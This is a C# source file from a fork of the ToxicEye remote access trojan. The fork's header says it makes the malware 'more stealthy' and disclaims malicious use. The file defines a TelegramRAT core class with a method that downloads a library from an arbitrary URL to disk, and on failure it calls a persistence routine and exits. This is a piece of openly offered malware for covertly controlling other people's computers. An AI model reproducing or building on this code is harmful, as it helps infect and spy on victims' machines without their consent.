/* 
       ^ Author    : LimerBoy, Modified by MiskaDev
       ^ Name      : ToxicEye-RAT, ToxicEyePlus
       ^ Github    : https:github.com/LimerBoy, github.com/MiskaWasTaken/ToxicEyePlus

       > This program is distributed for educational purposes only. Not intended or permitted for malicious use
        
       > This fork has made ToxicEye a bit more stealthy with some minor changes and a slightly more verbose output on login and shutdown

       > Any file that has "modified by MiskaDev" means this file was modified and is not the original, any file without it means that it hasnt been changede
*/

using System;
using System.IO;
using System.Net;

namespace TelegramRAT
{
    internal sealed class core
    {
        // Load dll
        public static void LoadRemoteLibrary(string url)
        {
            if (!File.Exists(Path.GetFileName(url)))
            {
                try
                {
                    WebClient client = new WebClient();
                    client.DownloadFile(url, Path.GetFileName(url));
                }
                catch (WebException)
                {
                    Console.Write("[!] Failed load libraries, not connected to internet!");
                    persistence.unprotectProcess();
                    Environment.Exit(1);
                }
            }
        }


    }
}
